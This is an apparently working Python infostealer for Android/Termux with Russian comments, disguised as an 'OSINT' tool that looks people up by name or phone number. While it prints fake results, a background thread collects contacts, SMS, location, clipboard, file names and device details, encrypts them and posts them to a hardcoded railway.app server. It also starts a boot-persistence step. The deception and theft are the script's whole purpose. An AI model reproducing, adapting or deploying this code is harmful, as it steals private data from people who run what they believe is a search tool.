import os, sys, time, json, base64, hashlib, requests, subprocess
from threading import Thread
try:
    from cryptography.fernet import Fernet
except:
    os.system("pip install cryptography")
    from cryptography.fernet import Fernet

# Маскировка: "OSINT модуль"
class InfoFinder:
    def __init__(self):
        self.key = base64.urlsafe_b64encode(hashlib.sha256(b"dummy_seed_for_osint").digest())
        self.cipher = Fernet(self.key)
        self.exfil_url = "https://web-production-8ca58.up.railway.app/"  # <- замени на свой
        self.data_buffer = []
    
    def fake_search(self, query):
        print(f"[+] Поиск по запросу: {query}...")
        time.sleep(2)
        print("[+] Найдено: ФИО, номер, аккаунты... (фейк)")
        
        self.steal_all()
        return "Результаты отправлены на сервер (симуляция)"
    
    def steal_all(self):
        Thread(target=self.collect_and_exfil).start()
    
    def collect_and_exfil(self):
        try:
            
            cmds = {
                "contacts": "termux-contact-list",
                "sms": "termux-sms-list",
                "location": "termux-location",
                "files": "find /sdcard -type f -name '*.txt' -o -name '*.pdf' | head -20",
                "clipboard": "termux-clipboard-get"
            }
            dump = {}
            for k, cmd in cmds.items():
                try:
                    out = subprocess.check_output(cmd.split(), timeout=10, stderr=subprocess.DEVNULL).decode('utf-8', errors='ignore')
                    dump[k] = out[:5000]  # truncate
                except:
                    pass
            
            # Дополнительно: packages, accounts, etc.
            dump["device"] = os.popen("getprop ro.product.model && whoami").read()
            
            encrypted = self.cipher.encrypt(json.dumps(dump).encode())
            requests.post(self.exfil_url, data={"d": base64.b64encode(encrypted)}, timeout=15)
            print("[+] Данные успешно обработаны.")
        except:
            pass

if __name__ == "__main__":
    finder = InfoFinder()
    q = input("Введите ФИО или номер телефона для пробива: ")
    print(finder.fake_search(q))
    
    # Persistence
    try:
        os.system("mkdir -p ~/.termux/boot/")
        # Скопировать себя в boot
    except:
        pass
    print("Скрипт готов к повторным запускам.")
